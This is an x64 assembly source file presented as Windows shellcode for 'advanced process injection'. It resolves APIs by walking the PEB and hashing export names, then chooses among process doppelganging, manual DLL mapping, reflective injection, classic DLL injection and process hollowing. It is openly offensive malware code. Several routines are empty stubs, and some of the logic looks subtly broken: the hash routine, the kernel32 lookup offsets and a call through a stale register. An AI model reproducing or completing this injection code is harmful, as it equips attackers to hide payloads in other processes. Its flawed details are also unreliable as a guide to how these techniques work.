; Windows x64 Shellcode - Advanced Process Injection
; Compatible with x64 calling convention
; Includes multiple injection techniques and evasion methods

BITS 64
DEFAULT REL

section .text
global _start

; Main shellcode entry point
_start:
    ; Save registers
    push rbp
    mov rbp, rsp
    
    ; Allocate stack space for local variables
    sub rsp, 0x100
    
    ; Get PEB address using TEB
    mov rax, gs:[0x60]          ; Get PEB from TEB
    mov [rbp-8], rax            ; Save PEB pointer
    
    ; Get kernel32.dll base address
    call get_kernel32_base
    mov [rbp-16], rax           ; Save kernel32 base
    
    ; Resolve required APIs
    call resolve_apis
    test rax, rax
    jz exit_shellcode
    
    ; Choose injection technique based on environment
    call detect_environment
    mov [rbp-24], rax           ; Save environment flags
    
    ; Execute appropriate injection technique
    test rax, 1                 ; Check if modern OS
    jnz modern_injection
    jmp legacy_injection

; Get kernel32.dll base address from PEB
get_kernel32_base:
    push rbp
    mov rbp, rsp
    
    mov rax, gs:[0x60]          ; Get PEB
    mov rax, [rax + 0x18]       ; Get PEB_LDR_DATA
    mov rax, [rax + 0x20]       ; Get InMemoryOrderModuleList
    
    ; Walk the loaded module list
walk_modules:
    mov rax, [rax]              ; Get next module
    mov rbx, [rax + 0x50]       ; Get BaseDllName buffer
    
    ; Check if this is kernel32.dll
    cmp word [rbx], 0x004B      ; 'K'
    jne next_module
    cmp word [rbx + 2], 0x0045  ; 'E'
    jne next_module
    cmp word [rbx + 4], 0x0052  ; 'R'
    jne next_module
    
    ; Found kernel32, get base address
    mov rax, [rax + 0x30]       ; Get DllBase
    jmp get_kernel32_done
    
next_module:
    mov rax, [rax]              ; Next module
    test rax, rax
    jnz walk_modules
    
    xor rax, rax                ; Return NULL if not found
    
get_kernel32_done:
    mov rsp, rbp
    pop rbp
    ret

; Resolve required Windows APIs
resolve_apis:
    push rbp
    mov rbp, rsp
    sub rsp, 0x50
    
    ; Get kernel32 base
    mov rbx, [rbp-16]           ; kernel32 base
    
    ; Get export table
    mov eax, [rbx + 0x3C]       ; PE header offset
    add rax, rbx                ; PE header address
    mov eax, [rax + 0x88]       ; Export table RVA
    add rax, rbx                ; Export table address
    
    ; Save export table address
    mov [rbp-0x20], rax
    
    ; Resolve GetProcAddress
    mov rcx, rbx                ; kernel32 base
    mov rdx, get_proc_addr_hash
    call find_function_by_hash
    mov [rbp-0x28], rax         ; Save GetProcAddress
    
    ; Resolve LoadLibraryA
    mov rcx, rbx
    mov rdx, load_library_hash
    call find_function_by_hash
    mov [rbp-0x30], rax         ; Save LoadLibraryA
    
    ; Resolve VirtualAlloc
    mov rcx, rbx
    mov rdx, virtual_alloc_hash
    call find_function_by_hash
    mov [rbp-0x38], rax         ; Save VirtualAlloc
    
    ; Resolve CreateThread
    mov rcx, rbx
    mov rdx, create_thread_hash
    call find_function_by_hash
    mov [rbp-0x40], rax         ; Save CreateThread
    
    ; Return success
    mov rax, 1
    
resolve_apis_done:
    add rsp, 0x50
    mov rsp, rbp
    pop rbp
    ret

; Find function by hash (ROR13 hash algorithm)
find_function_by_hash:
    push rbp
    mov rbp, rsp
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    
    mov rbx, rcx                ; Module base
    mov r8, rdx                 ; Target hash
    
    ; Get export table
    mov eax, [rbx + 0x3C]
    add rax, rbx
    mov eax, [rax + 0x88]
    add rax, rbx
    
    ; Get function arrays
    mov ecx, [rax + 0x18]       ; NumberOfNames
    mov edx, [rax + 0x20]       ; AddressOfNames
    add rdx, rbx
    mov esi, [rax + 0x24]       ; AddressOfNameOrdinals
    add rsi, rbx
    mov edi, [rax + 0x1C]       ; AddressOfFunctions
    add rdi, rbx
    
    xor r9, r9                  ; Counter
    
hash_loop:
    cmp r9d, ecx
    jge hash_not_found
    
    ; Get function name
    mov eax, [rdx + r9*4]
    add rax, rbx
    
    ; Calculate hash
    call calculate_hash
    
    ; Compare with target hash
    cmp rax, r8
    je hash_found
    
    inc r9
    jmp hash_loop
    
hash_found:
    ; Get ordinal and function address
    movzx eax, word [rsi + r9*2]
    mov eax, [rdi + rax*4]
    add rax, rbx
    jmp hash_done
    
hash_not_found:
    xor rax, rax
    
hash_done:
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    mov rsp, rbp
    pop rbp
    ret

; Calculate ROR13 hash of string in RAX
calculate_hash:
    push rcx
    push rdx
    
    xor ecx, ecx                ; Hash = 0
    
hash_char_loop:
    movzx edx, byte [rax]
    test dl, dl
    jz hash_calc_done
    
    ; Convert to uppercase
    cmp dl, 'a'
    jb hash_no_convert
    cmp dl, 'z'
    ja hash_no_convert
    sub dl, 0x20
    
hash_no_convert:
    ; ROR13 hash algorithm
    ror ecx, 13
    add ecx, edx
    
    inc rax
    jmp hash_char_loop
    
hash_calc_done:
    mov eax, ecx
    pop rdx
    pop rcx
    ret

; Detect execution environment
detect_environment:
    push rbp
    mov rbp, rsp
    
    ; Check OS version
    mov rax, gs:[0x60]          ; PEB
    mov eax, [rax + 0x118]      ; OSMajorVersion
    
    ; Windows 10/11 = version 10
    xor rbx, rbx
    cmp eax, 10
    jge modern_os
    
    ; Legacy OS flags
    or rbx, 2                   ; Legacy flag
    jmp detect_done
    
modern_os:
    or rbx, 1                   ; Modern flag
    
detect_done:
    mov rax, rbx
    mov rsp, rbp
    pop rbp
    ret

; Modern injection techniques (Windows 10+)
modern_injection:
    push rbp
    mov rbp, rsp
    
    ; Try process doppelgänging
    call process_doppelganger
    test rax, rax
    jnz injection_success
    
    ; Fallback to manual DLL mapping
    call manual_dll_mapping
    test rax, rax
    jnz injection_success
    
    ; Last resort: reflective DLL injection
    call reflective_dll_injection
    
injection_success:
    mov rsp, rbp
    pop rbp
    ret

; Legacy injection techniques
legacy_injection:
    push rbp
    mov rbp, rsp
    
    ; Classic DLL injection
    call classic_dll_injection
    test rax, rax
    jnz legacy_success
    
    ; Process hollowing
    call process_hollowing
    
legacy_success:
    mov rsp, rbp
    pop rbp
    ret

; Process Doppelgänging implementation
process_doppelganger:
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    ; Create transaction
    mov rcx, 0                  ; No resource manager
    mov rdx, 0                  ; No object attributes
    mov r8, 0                   ; No UOW
    mov r9, 0                   ; No TM handle
    mov qword [rsp+0x20], 0     ; No create options
    mov qword [rsp+0x28], 0     ; No isolation level
    mov qword [rsp+0x30], 0     ; No isolation flags
    mov qword [rsp+0x38], 0     ; No timeout
    
    ; Call NtCreateTransaction (would need to resolve first)
    ; This is a simplified stub - full implementation would resolve NTDLL
    
    ; For now, return failure to demonstrate structure
    xor rax, rax
    
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    ret

; Manual DLL mapping
manual_dll_mapping:
    push rbp
    mov rbp, rsp
    
    ; Allocate memory for DLL
    mov rcx, 0                  ; hProcess = current
    mov rdx, 0                  ; lpAddress = NULL
    mov r8, payload_size        ; Size
    mov r9, 0x3000             ; MEM_COMMIT | MEM_RESERVE
    mov qword [rsp+0x20], 0x40  ; PAGE_EXECUTE_READWRITE
    
    call qword [rbp-0x38]       ; VirtualAlloc
    test rax, rax
    jz mapping_failed
    
    ; Copy DLL to allocated memory
    mov rdi, rax                ; Destination
    mov rsi, payload_data       ; Source
    mov rcx, payload_size       ; Size
    rep movsb
    
    ; Parse PE headers and fix relocations/imports
    call fix_pe_image
    
    ; Execute DLL entry point
    call rax
    
    mov rax, 1                  ; Success
    jmp mapping_done
    
mapping_failed:
    xor rax, rax
    
mapping_done:
    mov rsp, rbp
    pop rbp
    ret

; Fix PE image (relocations and imports)
fix_pe_image:
    push rbp
    mov rbp, rsp
    
    ; Parse DOS header
    mov rbx, rdi                ; Image base
    cmp word [rbx], 0x5A4D      ; 'MZ' signature
    jne fix_failed
    
    ; Get NT headers
    mov eax, [rbx + 0x3C]       ; e_lfanew
    add rax, rbx                ; NT headers
    
    ; Verify PE signature
    cmp dword [rax], 0x00004550 ; 'PE\0\0'
    jne fix_failed
    
    ; Process relocations (simplified)
    ; In full implementation, would walk relocation table
    
    ; Process imports (simplified)
    ; In full implementation, would resolve all imports
    
    mov rax, 1                  ; Success
    jmp fix_done
    
fix_failed:
    xor rax, rax
    
fix_done:
    mov rsp, rbp
    pop rbp
    ret

; Reflective DLL injection
reflective_dll_injection:
    push rbp
    mov rbp, rsp
    
    ; Find reflective loader in payload
    call find_reflective_loader
    test rax, rax
    jz reflective_failed
    
    ; Execute reflective loader
    call rax
    
    mov rax, 1
    jmp reflective_done
    
reflective_failed:
    xor rax, rax
    
reflective_done:
    mov rsp, rbp
    pop rbp
    ret

find_reflective_loader:
    ; Stub - would scan payload for reflective loader function
    xor rax, rax
    ret

; Classic DLL injection
classic_dll_injection:
    push rbp
    mov rbp, rsp
    
    ; Open target process
    ; Allocate memory in target
    ; Write DLL path to target
    ; Create remote thread with LoadLibrary
    
    ; Simplified implementation
    xor rax, rax                ; Return failure for now
    
    mov rsp, rbp
    pop rbp
    ret

; Process hollowing
process_hollowing:
    push rbp
    mov rbp, rsp
    
    ; Create suspended process
    ; Unmap original image
    ; Map payload image
    ; Fix relocations and imports
    ; Resume execution
    
    ; Simplified implementation
    xor rax, rax
    
    mov rsp, rbp
    pop rbp
    ret

; Exit shellcode
exit_shellcode:
    ; Clean up and exit
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    
    ; Exit thread
    xor rcx, rcx
    ; Would call ExitThread here
    ret

; Data section
section .data

; API hashes (ROR13)
get_proc_addr_hash:     dd 0x7C0DFCAA
load_library_hash:      dd 0xEC0E4E8E
virtual_alloc_hash:     dd 0x91AFCA54
create_thread_hash:     dd 0x3F2A0489

; Placeholder for payload data
payload_data:           dd 0xDEADBEEF
payload_size:           dd 0x1000

; String constants (would be dynamically resolved)
ntdll_str:              db 'ntdll.dll', 0
kernel32_str:           db 'kernel32.dll', 0